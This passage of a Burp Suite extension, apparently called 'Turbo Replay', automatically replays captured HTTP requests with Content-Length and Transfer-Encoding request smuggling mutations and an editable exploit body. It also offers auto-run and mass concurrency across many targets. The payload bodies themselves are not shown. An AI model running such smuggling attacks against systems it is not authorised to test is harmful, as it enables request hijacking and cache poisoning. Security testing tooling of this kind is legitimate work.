            self._mutation_bodies[self._current_body_mutation] = text

    def _on_mutation_selected(self, event):
        self._save_current_body()
        sel = str(self._body_combo.getSelectedItem())
        self._current_body_mutation = sel
        body = self._mutation_bodies.get(sel, MUTATION_DEFAULT_BODIES.get(sel, ""))
        self._body_area.setText(body)

    def get_flag_code(self):
        text = self._flag_code_field.getText().strip()
        if not text:
            return None
        try:
            return int(text)
        except (ValueError, TypeError):
            return None

    def get_active_mutations(self):
        mutations = []
        for mut in ALL_MUTATIONS:
            cb = self._mut_checkboxes.get(mut)
            if cb is not None and cb.isSelected():
                mutations.append(mut)
        return mutations

    def processHttpMessage(self, tool_flag, message_is_request, message_info):
        if not message_is_request:
            return
        if tool_flag == self.TOOL_PROXY:
            if not self._proxy_cb.isSelected():
                return
        elif tool_flag == self.TOOL_INTRUDER:
            if not self._intruder_cb.isSelected():
                return
        else:
            return
        http_service = message_info.getHttpService()
        request_bytes = message_info.getRequest()
        if http_service is None or request_bytes is None:
            return
        analyzed = self._helpers.analyzeRequest(http_service, request_bytes)
        url = analyzed.getUrl()
        method = analyzed.getMethod()
        path = normalize_path(str(url.getPath()))
        host = str(http_service.getHost())
        port = http_service.getPort()
        protocol = str(http_service.getProtocol())
        key = (host, port, path)
        with self._seen_lock:
            if key in self._seen_paths:
                return
            self._seen_paths[key] = True
        try:
            default_count = int(self._replay_field.getText().strip())
            if default_count < 1:
                default_count = DEFAULT_REPLAY_COUNT
        except (ValueError, TypeError):
            default_count = DEFAULT_REPLAY_COUNT
        display_host = "%s://%s:%d" % (protocol, host, port) if port not in (80, 443) else "%s://%s" % (protocol, host)
        entry = EndpointEntry(
            path=path, host=display_host, method=method,
            replay_count=default_count,
            raw_request=request_bytes, http_service=http_service)
        autorun = self._autorun_cb.isSelected()
        model = self.table_model
        extender = self
        class AddRow(Runnable):
            def run(self_inner):
                row = model.add_entry(entry)
                if autorun:
                    extender._read_connection_count()
                    extender._launch_replay(entry, row)
        SwingUtilities.invokeLater(AddRow())

    def _build_ui(self):
        self._main_panel = JPanel(BorderLayout())
        self._main_panel.setBorder(BorderFactory.createEmptyBorder(8, 8, 8, 8))
        top_wrapper = JPanel()
        top_wrapper.setLayout(BoxLayout(top_wrapper, BoxLayout.Y_AXIS))
        row1 = JPanel(FlowLayout(FlowLayout.LEFT, 6, 3))
        row1.add(JLabel("Default Replay Count:"))
        self._replay_field = JTextField(str(DEFAULT_REPLAY_COUNT), 6)
        row1.add(self._replay_field)
        row1.add(JLabel("  Connections:"))
        self._conn_field = JTextField(str(DEFAULT_CONNECTIONS), 5)
        self._conn_field.setToolTipText("Concurrent raw socket connections per endpoint")
        row1.add(self._conn_field)
        row1.add(JLabel("  Flag Code:"))
        self._flag_code_field = JTextField("", 5)
        self._flag_code_field.setToolTipText("Status code to flag as High severity (e.g. 400)")
        row1.add(self._flag_code_field)
        row1.add(Box.createHorizontalStrut(10))
        row1.add(JButton("Start All", actionPerformed=self._on_start_all))
        row1.add(JButton("Start Selected", actionPerformed=self._on_start_selected))
        row1.add(JButton("Clear", actionPerformed=self._on_clear))
        row1.add(JButton("Reset Stuck", actionPerformed=self._on_reset_stuck))
        top_wrapper.add(row1)
        row2 = JPanel(FlowLayout(FlowLayout.LEFT, 6, 2))
        row2.add(JLabel("Sources:"))
        self._proxy_cb = JCheckBox("Proxy", True)
        row2.add(self._proxy_cb)
        self._intruder_cb = JCheckBox("Intruder", True)
        row2.add(self._intruder_cb)
        row2.add(Box.createHorizontalStrut(12))
        self._autorun_cb = JCheckBox("Auto-run", False)
        row2.add(self._autorun_cb)
        top_wrapper.add(row2)
        # --- CL mutations: split across multiple rows so checkboxes don't
        # get clipped by the parent BoxLayout when there are many mutations.
        self._mut_checkboxes = {}
        per_row = 7
        cl_chunks = [CL_MUTATIONS[i:i + per_row]
                     for i in range(0, len(CL_MUTATIONS), per_row)]
        for idx, chunk in enumerate(cl_chunks):
            row = JPanel(FlowLayout(FlowLayout.LEFT, 6, 2))
            label = "CL mutations:" if idx == 0 else " "
            row.add(JLabel(label))
            for mut in chunk:
                cb = JCheckBox(mut, True)
                cb.setToolTipText(
                    "%s method + Content-Length + smuggle body"
                    % MUTATION_METHODS.get(mut, "POST"))
                row.add(cb)
                self._mut_checkboxes[mut] = cb
            top_wrapper.add(row)
        # --- TE mutations: same multi-row treatment ---
        te_chunks = [TE_MUTATIONS[i:i + per_row]
                     for i in range(0, len(TE_MUTATIONS), per_row)]
        for idx, chunk in enumerate(te_chunks):
            row_te = JPanel(FlowLayout(FlowLayout.LEFT, 6, 2))
            label = "TE mutations:" if idx == 0 else " "
            row_te.add(JLabel(label))
            for mut in chunk:
                cb = JCheckBox(mut, True)
                cb.setToolTipText(
                    "%s method + Transfer-Encoding: chunked + chunked smuggle body"
                    % MUTATION_METHODS.get(mut, "POST"))
                row_te.add(cb)
                self._mut_checkboxes[mut] = cb
            top_wrapper.add(row_te)
        self._main_panel.add(top_wrapper, BorderLayout.NORTH)
        self._table = JTable(self.table_model)
        self._table.setSelectionMode(ListSelectionModel.MULTIPLE_INTERVAL_SELECTION)
        cm = self._table.getColumnModel()
        for i, w in enumerate([250, 180, 70, 80, 80, 120]):
            cm.getColumn(i).setPreferredWidth(w)
        class StatusRenderer(DefaultTableCellRenderer):
            def getTableCellRendererComponent(sr, table, value, isSel, hasFocus, row, col):
                comp = DefaultTableCellRenderer.getTableCellRendererComponent(
                    sr, table, value, isSel, hasFocus, row, col)
                if not isSel:
                    t = str(value) if value else ""
                    if t == STATUS_COMPLETED: comp.setForeground(Color(0, 128, 0))
                    elif t == STATUS_RUNNING: comp.setForeground(Color.BLUE)
                    elif t == STATUS_ERROR: comp.setForeground(Color.RED)
                    else: comp.setForeground(Color.GRAY)
                return comp
        cm.getColumn(4).setCellRenderer(StatusRenderer())
        table_scroll = JScrollPane(self._table)
        body_panel = JPanel(BorderLayout(2, 2))
        body_panel.setBorder(BorderFactory.createTitledBorder("Exploit Body (per mutation)"))
        body_top = JPanel(FlowLayout(FlowLayout.LEFT, 4, 2))
        body_top.add(JLabel("Mutation:"))
        self._body_combo = JComboBox(ALL_MUTATIONS)
        self._body_combo.addActionListener(self._on_mutation_selected)
        body_top.add(self._body_combo)
        body_panel.add(body_top, BorderLayout.NORTH)
        first_mut = ALL_MUTATIONS[0]
        init_body = self._mutation_bodies.get(first_mut, DEFAULT_CL_BODY)
        self._body_area = JTextArea(init_body, 8, 40)
        self._body_area.setFont(Font("Monospaced", Font.PLAIN, 12))
        self._body_area.setLineWrap(True)
        body_panel.add(JScrollPane(self._body_area), BorderLayout.CENTER)
        body_panel.add(JLabel("Use \\r\\n for CRLF."), BorderLayout.SOUTH)
        h_split = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, table_scroll, body_panel)
        h_split.setResizeWeight(0.65)
        self._log_area = JTextArea()
        self._log_area.setEditable(False)
        self._log_area.setFont(Font("Monospaced", Font.PLAIN, 12))
        log_scroll = JScrollPane(self._log_area)
        log_scroll.setBorder(BorderFactory.createTitledBorder("Replay Results / Log"))
        v_split = JSplitPane(JSplitPane.VERTICAL_SPLIT, h_split, log_scroll)
        v_split.setResizeWeight(0.6)
        self._main_panel.add(v_split, BorderLayout.CENTER)

    def _read_connection_count(self):
        try:
            v = int(self._conn_field.getText().strip())
            if v < 1: v = 1
            self.connection_count = v
        except (ValueError, TypeError):
            self.connection_count = DEFAULT_CONNECTIONS

    def _on_start_all(self, event):
        self._read_connection_count()
        for i, e in enumerate(self.table_model.entries):
            if e.status == STATUS_PENDING:
                self._launch_replay(e, i)

    def _on_start_selected(self, event):
        self._read_connection_count()
        for r in self._table.getSelectedRows():
            e = self.table_model.entries[r]
            if e.status == STATUS_PENDING:
                self._launch_replay(e, r)

    def _on_clear(self, event):
        with self._seen_lock:
            self._seen_paths.clear()
        self.table_model.clear()
        self._log_area.setText("")

    def _on_reset_stuck(self, event):
        count = 0
        for i, e in enumerate(self.table_model.entries):
            if e.status == STATUS_RUNNING:
                e.status = STATUS_ERROR
                e.error_msg = "Manually reset"
                count += 1
        if count > 0:
            self.table_model.fireTableDataChanged()
            self._log_on_edt("Reset %d stuck entries to Error" % count)
        else:
            self._log_on_edt("No stuck entries found")

    def _launch_replay(self, entry, row):
        self._ensure_master_running()
        self._work_queue.put((entry, row))

    def _get_pool(self):
        with self._pool_lock:
            if self._pool is None or self._pool_size != self.connection_count:
                if self._pool is not None:
                    self._pool.shutdown()
                self._pool = Executors.newFixedThreadPool(self.connection_count)
                self._pool_size = self.connection_count
            return self._pool

    def _ensure_master_running(self):
        with self._master_lock:
            if self._master_thread is None or not self._master_thread.isAlive():
                t = threading.Thread(target=self._master_loop)
                t.daemon = True
                self._master_thread = t
                t.start()

    def _master_loop(self):
        while True:
            try:
                entry, row = self._work_queue.take()
                self._read_connection_count()
                try:
                    ReplayTask(self, entry, row).run()
                except Exception as ex:
                    entry.status = STATUS_ERROR
                    entry.error_msg = str(ex)
                    self._log_on_edt(
                        "[ERROR] %s: %s" % (entry.path, str(ex)))
                # Ensure status is never left as Running
                if entry.status == STATUS_RUNNING:
                    entry.status = STATUS_ERROR
                    entry.error_msg = "Task did not complete"
                self.table_model.update_status(row)
                self._completed_count += 1
                if self._completed_count % 100 == 0:
                    self._trim_completed_entries()
            except Exception as ex:
                try:
                    self._callbacks.printError("Turbo Replay error: %s" % str(ex))
                except Exception:
                    pass

    def _trim_completed_entries(self):
        """Remove old completed/error entries from the table to prevent
        unbounded memory growth over tens of thousands of targets."""
        model = self.table_model
        keep_last = 100
        with model._lock:
            # Count completed entries
            completed = [i for i, e in enumerate(model.entries)
                         if e.status in (STATUS_COMPLETED, STATUS_ERROR)]
            if len(completed) <= keep_last:
                return
            remove_count = len(completed) - keep_last
            to_remove = set(completed[:remove_count])
            new_entries = [e for i, e in enumerate(model.entries)
                           if i not in to_remove]
            model.entries = new_entries

        class Refresh(Runnable):
            def run(self_inner):
                model.fireTableDataChanged()
        SwingUtilities.invokeLater(Refresh())

    def _log_on_edt(self, msg):
        log_area = self._log_area
        extender = self

        class Logger(Runnable):
            def run(self_inner):
                extender._log_line_count += 1
                # Truncate log when it gets too large
                if extender._log_line_count > MAX_LOG_LINES:
                    text = log_area.getText()
                    # Keep last half of lines
                    lines = text.split("\n")
                    if len(lines) > MAX_LOG_LINES // 2:
                        trimmed = "\n".join(lines[-(MAX_LOG_LINES // 2):])
                        log_area.setText(trimmed)
                        extender._log_line_count = MAX_LOG_LINES // 2
                log_area.append(msg + "\n")
                log_area.setCaretPosition(log_area.getDocument().getLength())
        SwingUtilities.invokeLater(Logger())

    def log(self, msg):
        self._log_on_edt(msg)
